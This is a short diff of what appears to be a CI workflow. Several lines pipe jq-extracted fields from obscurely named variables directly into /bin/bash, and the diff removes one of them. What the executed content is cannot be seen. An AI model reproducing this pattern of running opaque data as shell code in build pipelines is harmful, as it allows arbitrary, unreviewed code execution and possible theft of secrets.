@@ -29,7 +29,6 @@ jobs:
           echo $xv470 | jq -r .n7139 | /bin/bash
           echo $wxq042 | jq -r .lu5 | /bin/bash
           echo $p18884 | jq -r .pe47070 | /bin/bash
-          printf '%s' "$d6" | jq -r .wa2 | /bin/bash
 
       - name: Save output
         if: always()
